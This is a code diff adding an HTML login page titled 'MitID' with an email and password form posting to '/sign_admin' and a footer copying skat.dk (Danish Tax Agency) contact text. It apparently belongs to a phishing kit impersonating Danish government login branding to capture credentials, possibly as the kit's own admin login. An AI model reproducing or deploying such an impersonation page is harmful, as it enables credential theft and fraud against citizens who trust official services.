@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>MitID</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/static/style.css" />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
+      crossorigin="anonymous"
+    />
+  </head>
+
+  <body>
+    <script
+      src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+      integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
+      integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
+      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+      crossorigin="anonymous"
+    ></script>
+
+    <div class="signup-form">
+      <div class="container-fluid px-5" style="height: 75vh">
+        <form action="/sign_admin" method="POST">
+          <div class="form-group input-group-lg">
+            <label for="bruger-id">Email<span>*</span></label>
+            <input
+              type="text"
+              class="form-control sign-input"
+              id="name"
+              name="email"
+              required
+            />
+          </div>
+          <div class="form-group input-group-lg">
+            <label for="bruger-id">Password<span>*</span></label>
+            <input
+              type="password"
+              class="form-control sign-input"
+              id="address"
+              name="password"
+              required
+            />
+          </div>
+          <button
+            type="submit"
+            class="btn btn-primary btn-lg btn-block"
+            style="margin-top: 60px"
+          >
+            Fortsaet
+          </button>
+        </form>
+      </div>
+      <div class="bottom-content" style="bottom: 0">
+        <div class="content-border-bottom">
+          <h5>Tilgængelighedserklæring Kontakt Om cookies os:72 22 18 18</h5>
+        </div>
+        <p>
+          skat.dk er Skatteforvaltningens digitale indgang til selvbetjening og
+          vejledning om skatter og afgifter
+        </p>
+      </div>
+    </div>
+  </body>
+</html>
